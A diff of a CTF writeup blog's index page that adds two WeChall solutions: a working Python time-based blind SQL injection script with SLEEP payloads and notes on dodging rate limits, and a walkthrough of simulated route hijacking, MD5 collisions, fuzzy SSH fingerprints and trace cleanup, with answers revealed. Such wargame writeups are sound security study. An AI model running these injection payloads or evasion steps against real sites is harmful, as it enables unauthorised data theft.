@@ -234,7 +234,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">373</span>
+          <span class="site-state-item-count">375</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -245,7 +245,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">231</span>
+        <span class="site-state-item-count">232</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -375,6 +375,298 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-blinded-by-the-lighter/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-blinded-by-the-lighter/" class="post-title-link" itemprop="url">WeChall - Blinded by the lighter</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-07-11 18:50:38 / Modified: 19:03:33" itemprop="dateCreated datePublished" datetime="2026-07-11T18:50:38+08:00">2026-07-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-blinded-by-the-lighter/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-blinded-by-the-lighter/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Blinded by the Lighter 是一道 blind SQL injection 题，要求在每轮最多
+33 次查询的硬限制下，连续成功 3 轮提取 32 位 hex hash，且总时间不得超过
+9 分钟。核心思路是用 <code>SLEEP()</code> 的时间侧信道把 16
+个字符映射为不同延迟，每字符仅需 1 次查询。</p>
+<h3 id="challenge">Challenge</h3>
+<ul>
+<li>每轮 <strong>33 次查询</strong>上限</li>
+<li>需<strong>连续成功 3 轮</strong></li>
+<li><strong>9
+分钟</strong>时间限制（<code>BLIGHT2_TIME = 540s</code>）</li>
+<li>字符集 <code>ABCDEF0123456789</code></li>
+<li>无 addslashes/escape，过滤 <code>/*</code> 和
+<code>blight</code></li>
+</ul>
+<h3 id="solution">Solution</h3>
+<h4 id="oracle-php-time">Oracle: PHP Time</h4>
+<p>页面 footer 精确显示服务端执行时间（精度 ~0.02s），利用
+<code>SLEEP()</code> 映射 16 字符为不同时长，1 query/char，32 次刚好卡在
+33 限制内。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;&#x27;=&#x27;&#x27; and (</span></span><br><span class="line"><span class="string">  if(substr(password,1,1)=&#x27;</span>a<span class="string">&#x27;, sleep(1.2), 1) and</span></span><br><span class="line"><span class="string">  if(substr(password,1,1)=&#x27;</span>b<span class="string">&#x27;, sleep(2.4), 1) and</span></span><br><span class="line"><span class="string">  ...</span></span><br><span class="line"><span class="string">  if(substr(password,1,1)=&#x27;</span><span class="number">9</span><span class="string">&#x27;, sleep(19.2), 1)</span></span><br><span class="line"><span class="string">)-- -</span></span><br></pre></td></tr></table></figure>
+<p><code>round(PHP_Time / 1.2)</code> → 字符索引。</p>
+<h4 id="关键细节">关键细节</h4>
+<p><strong>不能轮间 reset</strong> — <code>blightReset(true)</code>
+会清零 consecutive counter。<code>blightSolved()</code>
+成功提交后自动调用 <code>blightReset(false)</code> 生成新 hash
+但保留计数。所以只应在最初 reset 一次。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s.get(URL + <span class="string">&#x27;?reset=me&#x27;</span>)  <span class="comment"># 只此一次</span></span><br><span class="line"><span class="keyword">for</span> rn <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">hash</span> = extract()</span><br><span class="line">    s.post(URL, &#123;<span class="string">&#x27;thehash&#x27;</span>: <span class="built_in">hash</span>, <span class="string">&#x27;mybutton&#x27;</span>: <span class="string">&#x27;Enter&#x27;</span>&#125;)</span><br><span class="line">    <span class="comment"># blightSolved() 内部已 reset(false)，无需手动</span></span><br></pre></td></tr></table></figure>
+<p><strong>STEP=1.2</strong> — 比 1.5 快（avg 10.2s vs 12.75s），比 1.0
+可靠（避免 <code>round()</code> 边界误判）。</p>
+<p><strong>requests.Session</strong> — 保持 TLS 连接，overhead
+~0.4s/req。比 curl 子进程快 30%+。</p>
+<p><strong>0.5s 请求间隔</strong> — 避免触发 WeChall 速率限制（~100
+次连续请求后 IP 封禁）。</p>
+<p><strong>Vultr VPS</strong> — 本地网络在代理后 12-15
+次请求即受限，需干净 IP。vc2-1c-1gb ($5/mo) 足够，3 轮结束即销毁。</p>
+<h4 id="实测数据">实测数据</h4>
+<table>
+<thead>
+<tr>
+<th>Round</th>
+<th>Time</th>
+<th>Hash</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>306s</td>
+<td><code>b87c01fcbab910c9f6efb47b58cb57db</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>396s</td>
+<td><code>ac56aee1f4bbb83845f6beb461cf1b15</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>457s</td>
+<td><code>6ea2f347f4e3093a0a4c4ec6fd0b1959</code></td>
+</tr>
+</tbody>
+</table>
+<p>总计 306+10+396+10+457 = <strong>1179s</strong>（含 10s
+轮间冷却）。</p>
+<h3 id="脚本">脚本</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;16-level sleep, STEP=1.2, 0.5s delay between requests.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为你的 WeChall session cookie</span></span><br><span class="line">C = &#123;<span class="string">&#x27;WC&#x27;</span>: <span class="string">&#x27;&lt;your_wechall_cookie&gt;&#x27;</span>&#125;</span><br><span class="line">U = <span class="string">&#x27;https://www.wechall.net/challenge/blind_lighter/index.php&#x27;</span></span><br><span class="line">M = <span class="string">&#x27; abcdef0123456789&#x27;</span></span><br><span class="line">S = <span class="number">1.2</span>  <span class="comment"># Faster than 1.5, more reliable than 1.0</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.headers.update(&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0&#x27;</span>&#125;)</span><br><span class="line">s.cookies.update(C)</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, HTTPAdapter(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">d, t=<span class="number">60</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.post(U, data=d, timeout=t, headers=&#123;<span class="string">&#x27;Referer&#x27;</span>: U&#125;).text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">url, t=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.get(url, timeout=t).text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pt</span>(<span class="params">b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Extract PHP Time value from response body.&quot;&quot;&quot;</span></span><br><span class="line">    m = re.search(<span class="string">r&#x27;PHP Time:\s*([\d.]+)s&#x27;</span>, b)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">float</span>(m.group(<span class="number">1</span>)) <span class="keyword">if</span> m <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ex</span>(<span class="params">pos</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Extract single character at position &lt;pos&gt; using 16-level sleep oracle.&quot;&quot;&quot;</span></span><br><span class="line">    conds = [</span><br><span class="line">        <span class="string">f&quot;if(substr(password,<span class="subst">&#123;pos&#125;</span>,1)=&#x27;<span class="subst">&#123;M[i]&#125;</span>&#x27;, sleep(<span class="subst">&#123;i * S&#125;</span>), 1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>)</span><br><span class="line">    ]</span><br><span class="line">    pl = <span class="string">&quot;&#x27; or &#x27;&#x27;=&#x27;&#x27; and (&quot;</span> + <span class="string">&#x27; and &#x27;</span>.join(conds) + <span class="string">&#x27;)-- -&#x27;</span></span><br><span class="line">    t = pt(post(&#123;<span class="string">&#x27;injection&#x27;</span>: pl, <span class="string">&#x27;inject&#x27;</span>: <span class="string">&#x27;Inject&#x27;</span>&#125;, <span class="number">60</span>))</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    i = <span class="built_in">round</span>(t / S)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt;= i &lt;= <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">return</span> M[i]</span><br><span class="line">    <span class="comment"># Rounding edge case: try ±1</span></span><br><span class="line">    <span class="keyword">for</span> o <span class="keyword">in</span> [-<span class="number">1</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt;= i + o &lt;= <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">return</span> M[i + o]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rd</span>(<span class="params">rn</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Run one round: extract 32-char hash and submit.&quot;&quot;&quot;</span></span><br><span class="line">    h = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    t0 = time.time()</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">        h += ex(pos)</span><br><span class="line">        <span class="keyword">if</span> pos % <span class="number">8</span> == <span class="number">0</span> <span class="keyword">or</span> pos == <span class="number">32</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;  R<span class="subst">&#123;rn&#125;</span> [<span class="subst">&#123;pos&#125;</span>/32] <span class="subst">&#123;h&#125;</span>  (<span class="subst">&#123;time.time() - t0:<span class="number">.0</span>f&#125;</span>s)&#x27;</span>)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)  <span class="comment"># Rate limit avoidance</span></span><br><span class="line">    t = time.time() - t0</span><br><span class="line">    body = post(&#123;<span class="string">&#x27;thehash&#x27;</span>: h, <span class="string">&#x27;mybutton&#x27;</span>: <span class="string">&#x27;Enter&#x27;</span>&#125;, <span class="number">60</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Your answer is correct&#x27;</span> <span class="keyword">in</span> body:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;  R<span class="subst">&#123;rn&#125;</span> SOLVED!(<span class="subst">&#123;t:<span class="number">.0</span>f&#125;</span>s)&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;s&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;Wow&#x27;</span> <span class="keyword">in</span> body:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;  R<span class="subst">&#123;rn&#125;</span> OK(<span class="subst">&#123;t:<span class="number">.0</span>f&#125;</span>s)&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;c&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;  R<span class="subst">&#123;rn&#125;</span> BAD(<span class="subst">&#123;t:<span class="number">.0</span>f&#125;</span>s) h=<span class="subst">&#123;h&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;x&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get(U + <span class="string">&#x27;?reset=me&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rn <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;=== R<span class="subst">&#123;rn&#125;</span> ===&#x27;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    r = rd(rn)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nSOLVED!&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> rn &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;  [cool 10s]&#x27;</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Done.&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-anderson-application-auditing/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-anderson-application-auditing/" class="post-title-link" itemprop="url">WeChall - Anderson Application Auditing (AAA)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-07-08 19:18:57 / Modified: 19:51:56" itemprop="dateCreated datePublished" datetime="2026-07-08T19:18:57+08:00">2026-07-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-anderson-application-auditing/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-anderson-application-auditing/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Anderson Application Auditing 是 storyline/realistic
+多阶段挑战。背景：VSA 委托 SoftMicro 开发程序、Anderson 负责审计，你作为
+hacker 需要劫持 Anderson 与 SoftMicro/VSA
+之间的通信，替换被审计程序为恶意版本。过程中收集六段 secret
+code，拼接后提交。</p>
+<p>已知信息：</p>
+<ul>
+<li>SoftMicro 网段：<code>207.46.197.0</code></li>
+<li>你的 public IP：<code>17.149.160.49</code></li>
+<li>Anderson 主页：<code>index2.html</code></li>
+</ul>
+<h3 id="solution">Solution</h3>
+<h4 id="第一阶段路由劫持">第一阶段：路由劫持</h4>
+<p>阅读 <code>tech_spec.txt</code>
+获取网络文档，其中泄露了路由器管理凭据 <code>admin/admin</code>。</p>
+<p>访问
+<code>router_config.html</code>，用默认凭据登录。添加两条路由，将
+SoftMicro 和 Anderson 相关网段的流量劫持到你的 public IP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route add -net 207.46.197.0 netmask 255.255.255.0 gw 17.149.160.49</span><br><span class="line">route add -net 12.110.110.0 netmask 255.255.255.0 gw 17.149.160.49</span><br></pre></td></tr></table></figure>
+<p>成功添加后获得第一段 secret code。</p>
+<h4 id="第二阶段md5-碰撞">第二阶段：MD5 碰撞</h4>
+<p>题目模拟 Anderson 通过 PKI/MD5 验证程序完整性。需要上传两个内容不同但
+MD5 相同的文件来替换合法程序。</p>
+<p>页面提示使用 MD5 碰撞工具。用 fastcoll（Linux）生成碰撞文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;prefix&quot;</span> &gt; good.txt</span><br><span class="line">fastcoll -p good.txt -o evil1.txt evil2.txt</span><br></pre></td></tr></table></figure>
+<p>上传两个碰撞文件后获得第二段 secret code。</p>
+<h4 id="第三阶段ssh-fingerprint">第三阶段：SSH Fingerprint</h4>
+<p>服务只检查 SSH fingerprint 的前 2 字节和最后 1 字节。需要用 fuzzy
+fingerprint 工具生成满足部分匹配的密钥对。</p>
+<p>使用 THC-FuzzyFingerprint（<code>ffp</code>）工具：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标 fingerprint（16 进制，只关心前 2 和后 1 nibble）</span></span><br><span class="line">ffp -f md5 -k 4 -l 1000 -t 03:88:9c:36:41:50:39:15:04:95:89:a4:15:84:fb:b3 -e -d /tmp</span><br></pre></td></tr></table></figure>
+<p>生成后上传 <code>ssh-rsa00.pub</code>（公钥）和
+<code>ssh-rsa00</code>（私钥），通过验证后获得第三、四段 secret
+code。</p>
+<h4 id="第四阶段清理痕迹">第四阶段：清理痕迹</h4>
+<p>回到 <code>router_config.html</code>，删除之前添加的路由：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route del -net 207.46.197.0 netmask 255.255.255.0 gw 17.149.160.49</span><br><span class="line">route del -net 12.110.110.0 netmask 255.255.255.0 gw 17.149.160.49</span><br></pre></td></tr></table></figure>
+<p>完成后获得第五、六段 secret code。</p>
+<h4 id="最终提交">最终提交</h4>
+<p>六段 secret code 按顺序拼接：</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">routeevilmd5mitmfingerprintgameover</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1488,251 +1780,6 @@ on and 0 is lights off"。将较低位 alpha 值（像素 0-24，alpha=0
 状态下 1 单位 = 字符间隔，3 单位 =
 单词间隔。解码得到第三个词：<strong>CHALLENGE</strong>。</p>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">BINARYMORSECHALLENGE</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-are-you-blind/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-are-you-blind/" class="post-title-link" itemprop="url">WeChall - Are you blind?</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-20 15:42:36 / Modified: 15:43:29" itemprop="dateCreated datePublished" datetime="2026-06-20T15:42:36+08:00">2026-06-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-are-you-blind/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-are-you-blind/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p><code>Blinded by the light</code> 的升级版（作者
-Mawekl）。同样从数据库中提取 32 位 hex password hash，但：</p>
-<ul>
-<li>Boolean blind <strong>无效</strong> — <code>blightVuln()</code> 的
-true/false 两个分支返回完全相同的语言字符串</li>
-<li>SLEEP/BENCHMARK <strong>被过滤</strong> —
-<code>stripos($password, 'sleep')</code> 和
-<code>stripos($password, 'benchmark')</code> 直接拦截</li>
-<li>预算 128 次查询，需要连续成功 3 轮</li>
-</ul>
-<h3 id="source-analysis">Source Analysis</h3>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blightVuln</span>(<span class="params">WC_Challenge <span class="variable">$chall</span>, <span class="variable">$password</span>, <span class="variable">$attempt</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment"># Blocked keywords</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$password</span>, <span class="string">&#x27;/*&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$password</span>, <span class="string">&#x27;blight&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$chall</span>-&gt;<span class="title function_ invoke__">lang</span>(<span class="string">&#x27;mawekl_blinds_you&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$attempt</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment"># No timing attempts</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$password</span>, <span class="string">&#x27;benchmark&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$password</span>, <span class="string">&#x27;sleep&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$chall</span>-&gt;<span class="title function_ invoke__">lang</span>(<span class="string">&#x27;mawekl_blinds_you&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$attempt</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span> = <span class="title function_ invoke__">blightDB</span>();</span><br><span class="line">    <span class="variable">$sessid</span> = <span class="title class_">GWF_Session</span>::<span class="title function_ invoke__">getSessSID</span>();</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT 1 FROM (SELECT password FROM blight WHERE sessid=<span class="subst">$sessid</span>) b WHERE password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$db</span>-&gt;<span class="title function_ 